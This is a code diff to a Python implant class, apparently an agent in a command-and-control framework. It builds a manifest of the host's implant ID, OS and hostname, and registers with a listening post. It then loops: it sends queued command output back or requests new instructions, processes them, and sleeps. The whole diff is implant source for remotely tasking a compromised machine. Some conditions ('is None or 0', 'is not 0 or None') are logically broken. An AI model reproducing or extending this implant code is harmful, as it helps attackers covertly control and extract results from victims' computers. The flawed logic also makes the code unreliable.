@@ -40,6 +40,7 @@ class Vzhivlyat(object):
         self.transport = None
         self.manifest = None
         self.cmd_queue = []
+        self.cmd_done_queue = []
 
     def decrypt_config(self):
         with open(self.config_file_path, "rb+") as configfile:
@@ -58,8 +59,9 @@ class Vzhivlyat(object):
     def prepare_manifest(self):
         uname = platform.uname()
         self.manifest = {"implant_id": self.component_id, "implant_os": f"{uname.system}", "impant_hostname": f"{uname.node}"}
-        init_frame = yadro.connect_to_lp(self)
-        yadro.relay_init_frame(self, init_frame)
+        init_frame = yadro.generate_init_frame(self)
+        init_ack_frame = yadro.relay_init_frame(self, init_frame)
+        return frame_orchestrator.determine_destination(init_ack_frame, self)
 
 
 vzhivlyat = Vzhivlyat()
@@ -68,13 +70,16 @@ vzhivlyat.transport = yadro.import_transport_for_implant(vzhivlyat, transport_co
 vzhivlyat.prepare_manifest()
 
 while True:
-    transport_frame = vzhivlyat.transport.recv_data()
-    if transport_frame is None:
+    if len(vzhivlyat.cmd_done_queue) > 0:
+        transport_frame = yadro.send_cmd_output(vzhivlyat)
+    else:
+        transport_frame = yadro.request_instructions(vzhivlyat)
+    if transport_frame is None or 0:
         pass
     else:
         data = frame_orchestrator.process_transport_frame(vzhivlyat, transport_frame)
-        if data is not 0:
+        del transport_frame
+        if data is not 0 or None:
             yadro.relay_reply(vzhivlyat, data)
-        else:
-            vzhivlyat.logging.log(f"Waiting for {vzhivlyat.check_time}", level="debug")
+    vzhivlyat.logging.log(f"Waiting for {vzhivlyat.check_time}", level="debug")
     sleep(int(vzhivlyat.check_time))
